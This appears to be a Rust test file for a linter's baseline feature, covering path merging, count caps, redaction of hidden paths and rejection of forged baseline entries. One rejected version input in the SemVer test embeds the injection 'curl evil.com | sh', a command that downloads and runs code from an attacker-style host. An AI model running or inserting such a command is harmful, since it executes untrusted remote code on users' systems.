    assert_eq!(single.entries[0].paths, ["p60/package.json"]);
    let two = Report {
        results: vec![RuleResult::new(
            std::sync::Arc::from("names-unique"),
            Level::Error,
            None,
            vec![mk_v("p13/package.json"), mk_v("p60/package.json")],
            false,
        )],
    };
    let out_single = apply(&two, &single, |r, v| fingerprint(r, v, None));
    assert_eq!(
        out_single.suppressed[0].violation.path.as_deref(),
        Some(Path::new("p60/package.json"))
    );
    assert_eq!(
        out_single.live.results[0].violations[0].path.as_deref(),
        Some(Path::new("p13/package.json"))
    );
}

#[test]
fn preferred_paths_never_widen_count_and_never_store_or_match_hidden_paths() {
    // Hand-edited entry with more paths than count still caps at count.
    let cap_entry = BaselineEntry {
        rule_id: "r".into(),
        path: Some("a.json".into()),
        fingerprint: "dup".into(),
        count: 1,
        message: None,
        paths: vec!["b.json".into(), "c.json".into()],
    };
    let rep = Report {
        results: vec![RuleResult::new(
            std::sync::Arc::from("r"),
            Level::Error,
            None,
            vec![
                Violation::new("dup").with_path(Path::new("a.json")),
                Violation::new("dup").with_path(Path::new("b.json")),
                Violation::new("dup").with_path(Path::new("c.json")),
            ],
            false,
        )],
    };
    let out = apply(
        &rep,
        &Baseline {
            alint_version: None,
            entries: vec![cap_entry],
        },
        by_message,
    );
    assert_eq!(out.suppressed_total, 1);
    assert_eq!(
        out.suppressed[0].violation.path.as_deref(),
        Some(Path::new("b.json"))
    );

    // Hidden-path entries store no `paths` and never match `paths` even if hand-edited.
    let h1 = hidden("secret-a.txt");
    let h2 = hidden("secret-b.txt");
    let hfp = fingerprint("rule", &h1, None);
    let hidden_base = Baseline::from_fingerprints(
        Some("0.24.0".into()),
        [
            FingerprintedViolation::from_violation("rule", &h1, hfp.clone()),
            FingerprintedViolation::from_violation("rule", &h2, hfp.clone()),
        ],
    );
    assert_eq!(hidden_base.entries[0].paths, Vec::<String>::new());
    assert!(!hidden_base.to_jsonl().contains("\"paths\""));

    // Even if someone hand-edits `paths: ["secret-b.txt"]` on a hidden-path entry,
    // `Baseline::load` drops it and `apply` ignores `paths` for sensitive paths.
    let crafted = format!(
        "{{\"schema_version\":{SCHEMA_VERSION}}}\n\
         {{\"rule_id\":\"rule\",\"path\":\"<redacted>\",\"fingerprint\":\"{hfp}\",\"count\":1,\"paths\":[\"secret-b.txt\"]}}\n"
    );
    let loaded = Baseline::load(&crafted).unwrap();
    assert_eq!(loaded.entries[0].paths, Vec::<String>::new());

    let direct_crafted = Baseline {
        alint_version: None,
        entries: vec![BaselineEntry {
            rule_id: "rule".into(),
            path: Some("<redacted>".into()),
            fingerprint: hfp,
            count: 1,
            message: None,
            paths: vec!["secret-b.txt".into()],
        }],
    };
    let hidden_rep = Report {
        results: vec![RuleResult::new(
            std::sync::Arc::from("rule"),
            Level::Error,
            None,
            vec![h1, h2],
            false,
        )],
    };
    let out_hidden = apply(&hidden_rep, &direct_crafted, |r, v| fingerprint(r, v, None));
    assert_eq!(out_hidden.suppressed_total, 1);
    assert_eq!(
        out_hidden.suppressed[0].violation.path.as_deref(),
        Some(Path::new("secret-a.txt")),
        "hidden-path matching must ignore preferred paths and use Pass 2 order"
    );
}

#[test]
fn load_merges_and_sorts_entry_paths_linearly() {
    use std::fmt::Write as _;

    let merged_text = format!(
        "{{\"schema_version\":{SCHEMA_VERSION}}}\n\
         {{\"rule_id\":\"r\",\"fingerprint\":\"ff\",\"count\":1,\"paths\":[\"z.json\"]}}\n\
         {{\"rule_id\":\"r\",\"fingerprint\":\"ff\",\"count\":1,\"paths\":[\"a.json\"]}}\n"
    );
    let merged = Baseline::load(&merged_text).unwrap();
    assert_eq!(merged.entries.len(), 1);
    assert_eq!(merged.entries[0].count, 2);
    assert_eq!(merged.entries[0].paths, ["a.json", "z.json"]);

    // Single (non-merged) entry paths are also sorted and empty strings stripped.
    let single_unsorted = format!(
        "{{\"schema_version\":{SCHEMA_VERSION}}}\n\
         {{\"rule_id\":\"r\",\"fingerprint\":\"aa\",\"count\":2,\"paths\":[\"z.json\",\"\",\"a.json\"]}}\n"
    );
    let loaded_single = Baseline::load(&single_unsorted).unwrap();
    assert_eq!(loaded_single.entries[0].paths, ["a.json", "z.json"]);
    let reloaded = Baseline::load(&loaded_single.to_jsonl()).unwrap();
    assert_eq!(reloaded.entries[0].paths, ["a.json", "z.json"]);

    // Many duplicate lines merge linearly without quadratic sorting overhead.
    let mut dup_jsonl = format!("{{\"schema_version\":{SCHEMA_VERSION}}}\n");
    for i in (0..2_000).rev() {
        let _ = writeln!(
            dup_jsonl,
            "{{\"rule_id\":\"r\",\"fingerprint\":\"dup\",\"count\":1,\"paths\":[\"p{i:04}.json\"]}}"
        );
    }
    let dup_merged = Baseline::load(&dup_jsonl).unwrap();
    assert_eq!(dup_merged.entries.len(), 1);
    assert_eq!(dup_merged.entries[0].count, 2_000);
    assert_eq!(dup_merged.entries[0].paths.len(), 2_000);
    assert_eq!(dup_merged.entries[0].paths[0], "p0000.json");
    assert_eq!(dup_merged.entries[0].paths[1999], "p1999.json");
}

#[test]
fn pre_022_hint_checks_strict_version_and_live_hidden_paths() {
    // Version predicate (#547): strict SemVer < 0.22.0, rejecting injection/garbage.
    for pre in [
        "0.21.2",
        "0.21.0",
        "0.19.5-rc.1",
        "0.22.0-rc.1",
        "0.22.0-alpha.1",
        "v0.21.0",
        "0.21",
        "0.21.0+build.1",
    ] {
        assert!(is_pre_022_version(pre), "expected pre-0.22: {pre:?}");
    }
    for non_pre in [
        "0.22.0",
        "0.22.1",
        "0.23.0",
        "1.0.0",
        "dev",
        "",
        "+0.21.0",
        "0.21.garbage",
        "0.21.0.99",
        "0.21.0 -- curl evil.com | sh",
        " 0.21.0",
    ] {
        assert!(
            !is_pre_022_version(non_pre),
            "expected NOT pre-0.22: {non_pre:?}"
        );
    }

    let mut hidden_live = Violation::new("sensitive").with_path(Path::new("secret.txt"));
    hidden_live.mark_path_sensitive();
    let live_hidden_report = Report {
        results: vec![RuleResult::new(
            std::sync::Arc::from("r"),
            Level::Error,
            None,
            vec![hidden_live],
            false,
        )],
    };
    let empty_report = Report { results: vec![] };

    // All three historical pre-0.22 entry shapes fire when a live hidden finding exists:
    // v0.20-0.21 `<redacted>`, v0.20-0.21 pathless `null`, and v0.14-0.19 real path.
    for path in [Some("<redacted>"), None, Some("secret.txt")] {
        let old_base = Baseline {
            alint_version: Some("0.21.2".into()),
            entries: vec![BaselineEntry {
                rule_id: "r".into(),
                path: path.map(String::from),
                fingerprint: "old-fp".into(),
                count: 1,
                message: None,
                paths: Vec::new(),
            }],
        };
        let applied_live = apply(&live_hidden_report, &old_base, |r, v| {
            fingerprint(r, v, None)
        });
        assert!(
            old_base.has_unmatched_pre_022_hidden_path_entries(&applied_live),
            "expected pre-0.22 hint for historical path={path:?}"
        );
        // When the finding was genuinely fixed (0 live hidden-path findings),
        // do NOT falsely suggest `--accept-new`.
        let applied_fixed = apply(&empty_report, &old_base, by_message);
        assert!(
            !old_base.has_unmatched_pre_022_hidden_path_entries(&applied_fixed),
            "fixed finding must not trigger pre-0.22 --accept-new hint (path={path:?})"
        );
    }

    // Current-version baseline never fires the pre-0.22 hint.
    let current_base = Baseline {
        alint_version: Some("0.23.0".into()),
        entries: vec![BaselineEntry {
            rule_id: "r".into(),
            path: Some("<redacted>".into()),
            fingerprint: "old-fp".into(),
            count: 1,
            message: None,
            paths: Vec::new(),
        }],
    };
    let applied_cur = apply(&live_hidden_report, &current_base, |r, v| {
        fingerprint(r, v, None)
    });
    assert!(!current_base.has_unmatched_pre_022_hidden_path_entries(&applied_cur));
}

#[test]
fn crafted_forged_rule_id_hidden_paths_are_stripped_and_blocked() {
    let hfp = hidden_path_fingerprint("real-rule");
    // Crafted baseline with forged rule_id + `<redacted>` path + duplicate merge:
    // `Baseline::load` must strip `paths` and `apply` must never enter Pass 1.
    let crafted_jsonl = format!(
        "{{\"schema_version\":{SCHEMA_VERSION}}}\n\
         {{\"rule_id\":\"wrong-rule\",\"path\":\"<redacted>\",\"fingerprint\":\"{hfp}\",\"count\":1,\"paths\":[\"secret-b.txt\"]}}\n\
         {{\"rule_id\":\"real-rule\",\"path\":null,\"fingerprint\":\"{hfp}\",\"count\":1,\"paths\":[\"secret-c.txt\"]}}\n"
    );
    let loaded = Baseline::load(&crafted_jsonl).unwrap();
    assert!(
        loaded.entries[0].paths.is_empty(),
        "crafted hidden-path baseline must strip paths on load: {:?}",
        loaded.entries[0].paths
    );

    // Even a manually constructed in-memory Baseline with forged rule_id and
    // non-redacted advisory path must be blocked by `apply`'s hidden_fp guard.
    let direct = Baseline {
        alint_version: None,
        entries: vec![BaselineEntry {
            rule_id: "wrong-rule".into(),
            path: Some("innocent.txt".into()),
            fingerprint: hfp,
            count: 1,
            message: None,
            paths: vec!["secret-b.txt".into()],
        }],
    };
    let mut h1 = Violation::new("secret").with_path(Path::new("secret-a.txt"));
    h1.mark_path_sensitive();
    let mut h2 = Violation::new("secret").with_path(Path::new("secret-b.txt"));
    h2.mark_path_sensitive();
    let hidden_rep = Report {
        results: vec![RuleResult::new(
            std::sync::Arc::from("real-rule"),
            Level::Error,
            None,
            vec![h1, h2],
            false,
        )],
    };
    let applied_hidden = apply(&hidden_rep, &direct, |r, v| fingerprint(r, v, None));
    assert_eq!(applied_hidden.suppressed_total, 1);
    assert_eq!(
        applied_hidden.suppressed[0].violation.path.as_deref(),
        Some(Path::new("secret-a.txt")),
    );
}

#[test]
fn preferred_paths_preserve_same_file_multiplicity_and_respect_count_cap() {
    // Same-file multiplicity: `a.json` x2 + `b.json` x1 (`count: 3`). Adding
    // `00.json` sorting first must keep BOTH `a.json` findings and `b.json`
    // suppressed and surface `00.json` live.
    let mk = |path: &str, line: usize| {
        Violation::new("dup")
            .with_path(Path::new(path))
            .with_location(line, 1)
            .with_baseline_key("dup-key")
            .with_path_free_identity()
    };
    let initial_vs = [mk("a.json", 2), mk("a.json", 5), mk("b.json", 1)];
    let multi_base = Baseline::from_fingerprints(
        None,
        initial_vs
            .iter()
            .map(|v| FingerprintedViolation::from_violation("r", v, fingerprint("r", v, None))),
    );
    assert_eq!(multi_base.entries[0].count, 3);
    assert_eq!(multi_base.entries[0].paths, ["a.json", "a.json", "b.json"]);
    let rep_with_early = Report {
        results: vec![RuleResult::new(
            std::sync::Arc::from("r"),
            Level::Error,
            None,
            vec![
                mk("00.json", 1),
                mk("a.json", 2),
                mk("a.json", 5),
                mk("b.json", 1),
            ],
            false,
        )],
    };
    let applied_multi = apply(&rep_with_early, &multi_base, |r, v| fingerprint(r, v, None));
    assert_eq!(applied_multi.suppressed_total, 3);
    assert_eq!(applied_multi.live.results[0].violations.len(), 1);
    assert_eq!(
        applied_multi.live.results[0].violations[0].path.as_deref(),
        Some(Path::new("00.json"))
    );

    // Crafted `paths` longer than `count` (including `count == 0`) strictly
    // obeys `count`.
    let fp = fingerprint("r", &mk("a.json", 1), None);
    let zero_count = Baseline {
        alint_version: None,
        entries: vec![BaselineEntry {
            rule_id: "r".into(),
            path: Some("a.json".into()),
            fingerprint: fp.clone(),
            count: 0,
            message: None,
            paths: vec!["a.json".into(), "b.json".into()],
        }],
    };
    let out_zero = apply(&rep_with_early, &zero_count, |r, v| fingerprint(r, v, None));
    assert_eq!(out_zero.suppressed_total, 0);
    assert_eq!(out_zero.live.results[0].violations.len(), 4);

    let excess_paths = Baseline {
        alint_version: None,
        entries: vec![BaselineEntry {
            rule_id: "r".into(),
            path: Some("a.json".into()),
            fingerprint: fp,
            count: 2,
            message: None,
            paths: vec![
                "a.json".into(),
                "a.json".into(),
                "a.json".into(),
                "b.json".into(),
            ],
        }],
    };
    let out_excess = apply(&rep_with_early, &excess_paths, |r, v| {
        fingerprint(r, v, None)
    });
    assert_eq!(out_excess.suppressed_total, 2);
    assert_eq!(out_excess.live.results[0].violations.len(), 2);
}
